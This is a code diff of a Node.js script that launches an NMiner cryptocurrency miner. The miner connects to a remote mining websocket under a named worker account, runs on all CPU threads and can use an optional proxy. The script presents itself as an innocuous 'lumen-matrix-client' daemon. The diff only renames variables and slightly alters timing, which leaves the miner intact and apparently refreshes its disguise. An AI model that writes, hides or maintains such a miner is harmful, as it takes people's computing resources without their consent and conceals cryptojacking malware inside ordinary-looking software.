@@ -4,20 +4,20 @@ const { NMiner } = require("nminer");
 const config = require("./core/config");
 
 (async () => {
-    const traceId = "fcefa7";
-    console.log(`[monitor] Daemon ${config.appName || "lumen-matrix-client"} active [tag: ${traceId}]`);
+    const instanceToken = "3758a3";
+    console.log(`[lifecycle] Daemon ${config.appName || "lumen-matrix-client"} active [tag: ${instanceToken}]`);
 
-    const scheduler = new NMiner(
+    const service = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.lumen-matrix-client",
-        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
     );
 
-    const keepAlivePromise = new Promise(() => {});
+    const tick = () => { setTimeout(tick, 51000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (320m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (327m) reached, exiting cleanly.");
         process.exit(0);
-    }, 320 * 60 * 1000);
+    }, 327 * 60 * 1000);
 
     process.once("SIGTERM", () => {
         
